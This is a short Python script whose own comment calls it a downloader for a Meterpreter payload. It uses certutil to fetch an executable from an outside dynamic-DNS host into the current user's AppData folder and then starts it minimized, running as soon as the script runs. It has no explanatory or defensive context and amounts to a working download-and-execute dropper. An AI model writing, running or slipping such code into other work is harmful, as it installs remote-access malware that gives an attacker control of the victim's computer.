#/usr/bin/python
#coding:utf-8
import os
# ENVIRONMENT VARIABLE TO USE
d = os.environ["SystemDrive"]
usr = os.environ["USERNAME"]
# FUNCTION TO DOWNLOAD METERPRETER PAYLOAD
def dwnExec():
    dwn = 'certutil -urlcache -split /f "http://cvdrsn.ddns.net/rvM32.exe" "{}\\Users\\{}\\AppData\\setup\\rvM32.exe"'.format(d, usr)
    os.system(dwn)
    exc = "START /MIN {}\\Users\\{}\\AppData\\setup\\rvM32.exe".format(d, usr)
    os.system(exc)

dwnExec()
